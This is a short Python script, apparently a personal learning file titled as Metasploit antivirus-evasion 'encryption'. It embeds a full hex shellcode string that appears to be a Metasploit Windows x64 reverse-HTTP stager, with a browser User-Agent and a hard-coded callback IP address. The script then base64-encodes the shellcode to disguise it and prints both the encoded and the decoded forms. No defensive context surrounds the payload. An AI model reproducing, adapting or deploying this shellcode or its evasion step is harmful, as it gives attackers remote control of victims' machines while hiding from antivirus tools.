# -*- coding: utf-8 -*-
# @Time    : 16 2月 2025 7:57 下午
# @Author  : codervibe
# @File    : msf免杀加密.py
# @Project : pythonBasics
import base64

# 原始shellcode（十六进制字符串）
shellcode = 'fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8891300004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f6f4750570080583b73062fecf8ac12cd1e35171a7afde814956f40ef0d84cb3b9eb8bb42e9f42ecc8cfdf7f857cb3ebdcb46ba8a308936c5ea9a40099d9f056b1266e5c984e8ec383c5f823fb41000557365722d4167656e743a204d6f7a696c6c612f342e302028636f6d70617469626c653b204d53494520382e303b2057696e646f7773204e5420352e313b2054726964656e742f342e303b20535631290d0a0098420632a72162609f23334d8ef62df28806160cd2f128bf80468954ab55bc5605090b56a4d940cedd3e77ce4c98680574a271ca70675f61e88ae47d7fcd85a4297dd9909ec406f19135efafefb89755acf85046c1d57589c611d18e79c2cddad9232d643996a5d83e89a533967659762eab84108dd7bcaa422ef40a9af915cc0d4fcfae8e75e94a557511a28d7f09713079c3bc326859cfe68a5e1ff854f729a05225da6426f3b29e5ae6b131514e3856b972d410565a4b4518111f940be21d0127c56254a10a681086825f41ca0fc2df1da61ef25a5ae4938ce2a70041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff34332e3136322e3132312e3134370012345678'

# 将十六进制字符串转换为字节对象
shellcode_bytes = bytes.fromhex(shellcode)

# 将字节对象进行base64编码
shellcode_base64 = base64.b64encode(shellcode_bytes)
print(f"Base64编码后的shellcode: {shellcode_base64.decode('utf-8')}")

print("============================================================================================")

# 将base64编码后的字节对象解码为字节对象
shellcode_b64decoded = base64.b64decode(shellcode_base64)
shellcode_hex = shellcode_b64decoded.hex()
print(f"解码后转换成十六进制的shellcode: {shellcode_hex}")
